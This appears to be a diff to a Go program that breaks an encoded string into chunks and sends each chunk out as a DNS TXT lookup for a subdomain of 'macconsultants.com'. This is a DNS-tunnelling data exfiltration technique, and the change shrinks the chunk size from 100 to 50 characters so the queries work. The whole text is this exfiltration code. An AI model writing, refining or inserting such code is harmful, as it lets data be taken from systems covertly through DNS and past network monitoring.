@@ -39,20 +39,20 @@ func main() {
         for {
 
           if initializer == 0{
-            int1 := 100*initializer
-            int2 := 100 + int1
+            int1 := 50*initializer
+            int2 := 50 + int1
             sendme := encoded[int1:int2]
-            length -= 100
+            length -= 50
             initializer += 1
             dom := sendme + ".macconsultants.com"
 
             r.LookupTXT(context.Background(),dom)
 
           } else {
-            int3 := 100*initializer
-            int4 := 100 + int3
+            int3 := 50*initializer
+            int4 := 50 + int3
 
-            if (length < 100){
+            if (length < 50){
               sendmefinal := encoded[int3:(int4-(length))]
               mydom := sendmefinal + ".macconsultants.com"
               r.LookupTXT(context.Background(),mydom)
@@ -62,7 +62,7 @@ func main() {
             sendme2 := encoded[int3:int4]
             dom2 := sendme2 + ".macconsultants.com"
             r.LookupTXT(context.Background(),dom2)
-            length -= 100
+            length -= 50
             initializer += 1
           }
 
